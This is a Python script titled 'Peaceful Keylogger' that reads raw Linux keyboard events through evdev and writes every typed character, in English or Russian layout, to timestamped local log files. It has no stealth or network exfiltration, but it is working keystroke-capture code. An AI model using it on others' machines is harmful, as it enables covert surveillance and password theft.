"""
Peaceful Keylogger
Connect to raw linux input, read every key_stroke and record it in the log
"""
from evdev import InputDevice, ecodes, events
import json
import datetime
import os
from layout import getActiveLayout


# TODO: create separate module to handle jsons
def readKeyMap(fdir: str) -> dict:
    with open(fdir, 'r') as file:
        data = json.load(file)
    return data

# TODO: make it work for any number of json-files
def loadKeyDatabases() -> tuple[dict[str, str], dict[str, str]]:
    engKeyMap = readKeyMap('engKeyMap.json')
    rusKeyMap = readKeyMap('rusKeyMap.json')
    return engKeyMap, rusKeyMap

def createLogFile(fdir: str = "Captain's log") -> str:
    """
    Handle log creation

    fdir - folder for all logs
    """
    if not os.path.exists(fdir):
        os.makedirs(fdir)

    current_time = datetime.datetime.now()
    formatted_time = current_time.strftime('%d.%m.%Y___%H:%M:%S')
    file_name = f'{fdir}/keylog___{formatted_time}.txt'

    return file_name

# TODO: process file after it is saved... extra spaces, lines, etc
def filePostProcessing() -> None:
    pass

def main():
    # TODO: search for keyboard input event automatically 
    device = InputDevice('/dev/input/event2')
    engKeyMap, rusKeyMap = loadKeyDatabases()
    
    try:
        file_name = createLogFile()
        with open(file_name, 'w') as file:
            layout = engKeyMap
            prev_key = cur_key = f'UNKNOWN_KEY'
            for event in device.read_loop():
                if event.type == ecodes.EV_KEY:
                    key_event = events.KeyEvent(event)
                    if key_event.keystate == key_event.key_down:
                        keycode = key_event.keycode
                        cur_key = keycode
                        if cur_key == 'KEY_SPACE' and prev_key == 'KEY_LEFTMETA':
                            if layout == engKeyMap:
                                layout = rusKeyMap
                            else:
                                layout = engKeyMap
                            print(f'layout has been changed')
                        if key_event.keycode in layout:
                            char = layout[key_event.keycode]
                            print(f'\n{cur_key} has been pressed\n{prev_key} was before')
                        else:
                            char = ''
                            print(f'\n<UNKNOWN_KEY> has been pressed')
                        file.write(char)
                        file.flush()
                        prev_key = cur_key
    except KeyboardInterrupt:
        print(f'Stop')
    

if __name__ == '__main__':
    main()


